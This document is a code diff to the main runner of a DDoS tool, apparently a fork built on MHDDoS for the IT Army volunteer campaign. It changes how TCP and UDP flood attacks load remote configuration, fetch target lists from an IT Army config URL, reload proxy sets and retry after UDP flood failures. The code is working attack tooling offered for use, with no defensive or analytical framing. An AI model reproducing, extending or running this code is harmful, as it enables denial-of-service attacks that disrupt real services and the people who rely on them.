@@ -14,15 +14,15 @@ from typing import List, Optional, Set, Tuple, Union
 
 from src.cli import init_argparse
 from src.core import (
-    cl, COPIES_AUTO, CPU_COUNT, CPU_PER_COPY, DEFAULT_THREADS, FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
-    IT_ARMY_CONFIG_URL, logger, MAX_COPIES_AUTO, ONLY_MY_IP, REFRESH_OVERTIME, REFRESH_RATE,
-    SCHEDULER_MAX_INIT_FRACTION, SCHEDULER_MIN_INIT_FRACTION, setup_worker_logger,
+    cl, COPIES_AUTO, CPU_COUNT, CPU_PER_COPY, DEFAULT_THREADS, logger, MAX_COPIES_AUTO, SCHEDULER_MAX_INIT_FRACTION,
+    SCHEDULER_MIN_INIT_FRACTION, setup_worker_logger, UDP_FAILURE_BUDGET_FACTOR, UDP_FAILURE_DELAY_SECONDS,
+    USE_ONLY_MY_IP,
 )
 from src.i18n import DEFAULT_LANGUAGE, set_language, translate as t
 from src.mhddos import AsyncTcpFlood, AsyncUdpFlood, AttackSettings, main as mhddos_main
 from src.output import print_banner, print_status, show_statistic
 from src.proxies import ProxySet
-from src.system import fix_ulimits, is_latest_version, setup_event_loop, WINDOWS_WAKEUP_SECONDS
+from src.system import fix_ulimits, load_configs, setup_event_loop, WINDOWS_WAKEUP_SECONDS
 from src.targets import Target, TargetsLoader
 
 
@@ -109,13 +109,14 @@ async def run_udp_flood(runnable: AsyncUdpFlood) -> None:
             raise
         except Exception:
             num_failures += 1
-            if num_failures >= FAILURE_BUDGET_FACTOR:
-                await asyncio.sleep(FAILURE_DELAY_SECONDS)
+            if num_failures >= UDP_FAILURE_BUDGET_FACTOR:
+                await asyncio.sleep(UDP_FAILURE_DELAY_SECONDS)
                 num_failures = 0
 
 
 async def run_ddos(args):
-    is_old_version = not await is_latest_version()
+    local_config, config = await load_configs()
+    is_old_version = (local_config['version'] < config['version'])
     if is_old_version:
         logger.warning(
             f"{cl.CYAN}{t('A new version is available, update is recommended')}{cl.RESET}: "
@@ -260,7 +261,7 @@ async def run_ddos(args):
         print()
 
     if args.itarmy:
-        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
+        targets_loader = TargetsLoader([], config['it_army_config_url'])
     else:
         targets_loader = TargetsLoader(args.targets, args.config)
 
@@ -276,10 +277,10 @@ async def run_ddos(args):
         return
 
     # initial set of proxies
-    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
+    use_my_ip = min(args.use_my_ip, USE_ONLY_MY_IP)
     proxies = ProxySet(args.proxy, args.proxies, use_my_ip)
     if proxies.has_proxies:
-        num_proxies = await proxies.reload()
+        num_proxies = await proxies.reload(config)
         if num_proxies == 0:
             logger.error(f"{cl.RED}{t('No working proxies found - stopping the attack')}{cl.RESET}")
             return
@@ -292,7 +293,7 @@ async def run_ddos(args):
 
     async def stats_printer():
         it, cycle_start = 0, time.perf_counter()
-        refresh_rate = REFRESH_RATE
+        refresh_rate = 5
 
         print_status(threads, use_my_ip, False)
         while True:
@@ -302,7 +303,7 @@ async def run_ddos(args):
             if it >= 20:
                 it = 0
                 passed = time.perf_counter() - cycle_start
-                overtime = bool(passed > refresh_rate * REFRESH_OVERTIME)
+                overtime = bool(passed > 2 * refresh_rate)
                 print_banner(args)
                 print_status(threads, use_my_ip, overtime)
 
@@ -343,7 +344,7 @@ async def run_ddos(args):
         while True:
             try:
                 await asyncio.sleep(reload_after)
-                if (await proxies.reload()) == 0:
+                if (await proxies.reload(config)) == 0:
                     logger.warning(
                         f"{cl.MAGENTA}{t('Failed to reload proxy list - the previous one will be used')}{cl.RESET}"
                     )
@@ -402,12 +403,6 @@ def main():
         )
 
     print_banner(args)
-
-    if args.table:
-        logger.warning(
-            f'{cl.RED}Параметр `--table` видалено - спробуйте покращений вивід за замовчуванням, або скористайтеся параметром `--debug`{cl.RESET}'
-        )
-        print()
 
     if args.debug:
         logger.warning(
